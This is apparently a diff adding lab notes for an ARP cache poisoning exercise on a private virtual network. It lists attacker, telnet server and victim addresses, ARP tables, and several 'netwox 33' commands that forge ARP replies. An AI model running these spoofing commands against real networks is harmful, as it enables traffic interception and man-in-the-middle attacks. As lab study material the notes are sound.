@@ -1,0 +1,48 @@
+Attacker
+========
+
+Iface: eth0
+IP   : 172.16.234.138 
+MAC  : 00:0c:29:1b:4c:2c
+
+Server Running Telnet
+======
+
+Iface: eth1
+IP   : 172.16.234.142
+MAC  : 00:0c:29:77:5b:8e
+
+
+Victim (MAC)
+======
+
+Iface: eth0
+IP   : 172.16.234.2
+MAC  : 00:50:56:c0:00:08 
+
+ARP Before (On Telnet Server)
+
+rambo@ubuntu:~$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+172.16.234.2             ether   00:50:56:f3:e5:e6   C                     eth1
+172.16.234.1             ether   00:50:56:c0:00:08   C                     eth1
+
+==================================================================================
+ARP On Victim's Computer (Running Mac OSX)
+~ arp -a
+? (172.16.234.142) at 0:c:29:77:5b:8e on vmnet8 ifscope [ethernet]
+? (192.168.1.1) at 0:16:b6:2c:10:b on en0 ifscope [ethernet]
+
+
+sudo netwox 33 -d "vmnet8" -a a:b:c:d:e:f -b 00:50:56:f3:e5:e6 -f a:b:c:d:e:f -g 172.16.234.142 -h 00:50:56:f3:e5:e6 -i 172.16.234.2
+
+
+sudo netwox 33 -d Eth0 -b a:b:c:d:e:f -i 172.16.234.138 -f a:b:c:d:e:f -g 172.16.234.2
+
+  netwox 33 [-d device] [-a eth] [-b eth] [-c uint32] [-e uint32] [-f eth] [-g ip] [-h eth] [-i ip]
+Parameters:
+
+parameter	description	example
+sudo netwox 33 -d eth0 -a 00:0c:29:1b:4c:2c -b 00:50:56:f3:e5:e6 -f 0:1:1:1:1:1 -g 0.0.0.0 -h 0:0:0:0:0:0 -i 0.0.0.0
+
+
